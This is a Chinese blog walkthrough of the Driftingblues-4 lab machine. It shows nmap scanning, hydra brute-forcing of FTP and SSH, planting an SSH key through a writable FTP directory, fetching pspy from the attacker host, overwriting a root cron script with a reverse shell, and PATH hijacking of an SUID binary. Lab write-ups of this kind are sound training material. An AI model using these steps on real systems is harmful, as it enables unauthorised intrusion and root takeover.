<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Hackmyvm综合靶机 | Driftingblues-4 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Hackmyvm综合靶机 | Driftingblues-4" />
<meta property="og:description" content="前言提要 ​ 4.7号晚，接收建议。
​ 我是否太注重于打靶？更应该多了解了解常见的框架比如Spring、Apache等以及多积累相关经验，捋清楚自己的思绪。
​ 后期的博客应该会多多更新常见CMS的相关知识，以及一些代码的编写…（把这系列靶机打完后，多更多设计其他知识不仅限于靶机wp）
kali：192.168.132.139
靶机：192.168.132.172
信息收集 #先简单扫端口 nmap -p- 192.168.132.172 #再全面扫面 nmap -A -sV -p- -T4 192.168.132.172 开放端口21、22、80（常规想法：21和22端口日常爆破，去80端口的web页面进一步信息收集）
页面没东西，但是在源代码里面有一串密文
Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09 #四次解密后得到一个隐藏目录 /imfuckingmad.txt 去隐藏目录看一看又是一个奇怪的加密，寻找解密方式
http://www.dcode.fr/cipher-identifier 发现是 Brainfuck 解密，然后进行解密 得到一张二维码: /iTiS3Cr3TbiTCh.png 然后去在线二维码解密得到一个网址：https://i.imgur.com/a4JjS76.png
去到页面发现一些账号名字，记下来放进user.txt
拿着账号去爆破FTP和SSH(利用的是本地的密码本rockyou)
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.132.172 ssh hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.132.172 ftp 然后是爆破了ftp的账号：luther 密码：mypics
成功登陆ftp，发现hubert的目录权限可以任意读写
然而进入hubert却什么东西都没有
ftp 192.168.132.172 ls cd hubert ls -al 公私钥登陆 考虑在hubert用户的目录下写下私钥来进行免密登陆
本地生成公钥对
把公钥复制成authorized_keys文件
在家目录下创建.ssh目录，然后将kali的公钥上传到该目录下
mkdir .ssh cd ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/6d46c194ad3df0cfa3549cc29d1147be/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-11T19:39:50+08:00" />
<meta property="article:modified_time" content="2022-04-11T19:39:50+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Hackmyvm综合靶机 | Driftingblues-4</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>前言提要</h2> 
<p>​ 4.7号晚，接收建议。</p> 
<p>​ 我是否太注重于打靶？更应该多了解了解常见的框架比如Spring、Apache等以及多积累相关经验，捋清楚自己的思绪。</p> 
<p>​ 后期的博客应该会多多更新常见CMS的相关知识，以及一些代码的编写…（把这系列靶机打完后，多更多设计其他知识不仅限于靶机wp）</p> 
<p>kali：192.168.132.139</p> 
<p>靶机：192.168.132.172</p> 
<h2><a id="_12"></a>信息收集</h2> 
<pre><code>#先简单扫端口
nmap -p- 192.168.132.172
#再全面扫面
nmap -A -sV -p- -T4 192.168.132.172
</code></pre> 
<p><img src="https://images2.imgbox.com/7b/d4/xeMQTuUQ_o.png" alt="image-20220408163839440"></p> 
<p>开放端口21、22、80（常规想法：21和22端口日常爆破，去80端口的web页面进一步信息收集）</p> 
<p>页面没东西，但是在源代码里面有一串密文</p> 
<pre><code>Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09

#四次解密后得到一个隐藏目录
/imfuckingmad.txt
</code></pre> 
<p>去隐藏目录看一看又是一个奇怪的加密，寻找解密方式</p> 
<pre><code>http://www.dcode.fr/cipher-identifier

发现是 Brainfuck 解密，然后进行解密
得到一张二维码: /iTiS3Cr3TbiTCh.png
</code></pre> 
<p>然后去在线二维码解密得到一个网址：https://i.imgur.com/a4JjS76.png</p> 
<p><img src="https://images2.imgbox.com/77/5f/xKrgtQoH_o.png" alt="image-20220407162737606"></p> 
<p>去到页面发现一些账号名字，记下来放进user.txt</p> 
<p>拿着账号去爆破FTP和SSH(利用的是本地的密码本rockyou)</p> 
<pre><code>hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.132.172 ssh
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.132.172 ftp
</code></pre> 
<p><img src="https://images2.imgbox.com/a3/34/M0X92KNZ_o.png" alt="image-20220408164951311"></p> 
<p>然后是爆破了ftp的<strong>账号：luther 密码：mypics</strong></p> 
<p>成功登陆ftp，发现hubert的目录权限可以任意读写</p> 
<p>然而进入hubert却什么东西都没有</p> 
<pre><code>ftp 192.168.132.172
ls
cd hubert
ls -al
</code></pre> 
<p><img src="https://images2.imgbox.com/7d/c8/xQDWDNqY_o.png" alt="image-20220408163516844"></p> 
<h2><a id="_73"></a>公私钥登陆</h2> 
<p>考虑在hubert用户的目录下写下私钥来进行免密登陆</p> 
<p>本地生成公钥对</p> 
<p>把公钥复制成authorized_keys文件<img src="https://images2.imgbox.com/f7/81/7LRIEUTE_o.png" alt="image-20220407163536583"></p> 
<p>在家目录下创建.ssh目录，然后将kali的公钥上传到该目录下</p> 
<pre><code>mkdir .ssh
cd .ssh
put authorized_keys

ssh hubert@192.168.132.166 -i key
</code></pre> 
<p><img src="https://images2.imgbox.com/9f/a3/ASR36Lj0_o.png" alt="image-20220408162134306"></p> 
<p><img src="https://images2.imgbox.com/10/f3/eGS3gOTx_o.png" alt="image-20220408162313815"></p> 
<h2><a id="_95"></a>提权</h2> 
<p>在本地目录下有一个py文件，打开看一看</p> 
<p>属主是root且内容执行的是系统命令</p> 
<p><img src="https://images2.imgbox.com/a9/5f/SVAKCQI7_o.png" alt="image-20220408162420662"></p> 
<p>判断该程序是否为定时任务（下载pspy64）</p> 
<pre><code>wget http://192.168.111.7/pspy64
chmod +x pspy64
./pspy64
</code></pre> 
<p>发现该py文件一分钟执行一次，所以我们可以利用定时任务获取root权限</p> 
<p>使用nano修改文件写入反弹shell，并保存为emrgency.pye</p> 
<p>然后再次进行覆盖</p> 
<pre><code>nano emergency.py
ls
mv emergency.pye emergency.py
cat emergency.py
</code></pre> 
<p><img src="https://images2.imgbox.com/89/54/xDfpzfWN_o.png" alt="image-20220408163134170"></p> 
<p>在kali本机监听，等待反弹shell成功即可获取root</p> 
<pre><code>nc -lvnp 3333
</code></pre> 
<p><img src="https://images2.imgbox.com/6b/0f/oBI8Jz1b_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="_133"></a>第二种提权：使用环境变量进行命令劫持提权</h3> 
<p>这个提权步骤是和blues3一模一样的</p> 
<p>搜索一下具有suid权限的命令</p> 
<pre><code class="prism language-shell"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre> 
<p><img src="https://images2.imgbox.com/99/68/HU1j8jwT_o.png" alt="image-20220406194732333"></p> 
<p>发现一个getinfo命令</p> 
<p>执行一下发现，这个命令集合了（系统命令）</p> 
<pre><code class="prism language-shell"><span class="token function">ifconfig</span>
<span class="token function">cat</span> /etc/hosts
<span class="token function">uname</span> -a
</code></pre> 
<p>所以思路：修改其中一个命令即可获取root权限</p> 
<pre><code>这里既然调用了系统命令，那么我们可以自行编写一个同名文件，比如说cat，因为我们猜测getinfo中使用了cat命令，如若我们可以添加环境变量，getinfo在调用命令时首先检索环境变量就会调用到我们伪造的cat，执行我们想要的命令，来达到提权的效果，即使用环境变量进行命令劫持提权
</code></pre> 
<pre><code class="prism language-shell">因此，在这种情况下，我们可以在环境变量 <span class="token environment constant">PATH</span> 中提供一个目录 <span class="token punctuation">(</span>/tmp<span class="token punctuation">)</span>，并创建一
个 <span class="token function">ip</span> 或者 <span class="token function">cat</span> 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权：
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp/:<span class="token environment constant">$PATH</span>     把/tmp路径加入到系统路径中。
<span class="token builtin class-name">cd</span> /tmp						
<span class="token builtin class-name">echo</span> <span class="token string">'/bin/bash'</span> <span class="token operator">&gt;</span> <span class="token function">ip</span>		把/bin/bash写入到ip中。
<span class="token function">chmod</span> +x <span class="token function">ip</span>					增加执行权限
/usr/bin/getinfo
</code></pre> 
<p><img src="https://images2.imgbox.com/ac/4d/Lj3aW5qZ_o.png" alt="image-20220408164917217"></p> 
<p><img src="https://images2.imgbox.com/3e/30/kp9fwxRG_o.png" alt="image-20220406195314111"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/54d47c52fa922d518c2f5e24a938a060/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">SHAP的介绍和应用（附代码）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/56d49fac927afe520ada9ef3487dc7b8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Depthwise 卷积 ，Pointwise 卷积与普通卷积的区别</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>